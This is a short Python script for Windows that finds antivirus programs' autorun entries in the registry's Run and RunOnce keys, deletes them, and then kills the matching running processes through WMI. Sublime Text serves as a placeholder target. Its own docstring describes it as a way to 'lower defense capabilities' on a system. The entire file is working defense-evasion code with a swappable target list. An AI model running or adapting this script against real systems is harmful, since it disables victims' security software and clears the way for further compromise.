import winreg, wmi, os, signal


def kill_program_in_autorun():
    """
    Windows only. Tested on Windows 11.
    
    Given a list of available antivirus programs (using 'Sublime Text' for practical example), this script will identify & delete the program in the Registry Editor.

    Lastly, it will delete any running processes that match the provided list.

    This function is an example of how to run targeted deletion to lower defense capabilities on the desired system. 
    """

    av_names_list = ["SublimeText"]
    process_names_list = ["sublime_text.exe"]

    reghives = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]
    regpaths = [
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    ]

    for reghive in reghives:
        for regpath in regpaths:
            reg = winreg.ConnectRegistry(None, reghive)
            key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_READ)
            try:
                index = 0
                while True:
                    val = winreg.EnumValue(key, index)
                    for name in av_names_list:
                        print(f"checking if '{name}' matches registry key '{val[0]}'")
                        if name in val[0]:
                            print(f"*** found matching registry key for '{name}'")
                            print(f"deleting autorun key: {val[0]}")
                            key2 = winreg.OpenKey(
                                reg, regpath, 0, access=winreg.KEY_SET_VALUE
                            )
                            winreg.DeleteValue(key2, val[0])
                        index += 1
            except OSError:
                ()

    f = wmi.WMI()
    for name in process_names_list:
        print(f"checking if any processes match {name}")
        for process in f.Win32_Process():
            if name == process.Name:
                print(
                    f"*** found an active process '{process.Name}' which matches {name}"
                )
                print(f"killing process id {process.processId}")
                os.kill(int(process.processId), signal.SIGTERM)


kill_program_in_autorun()
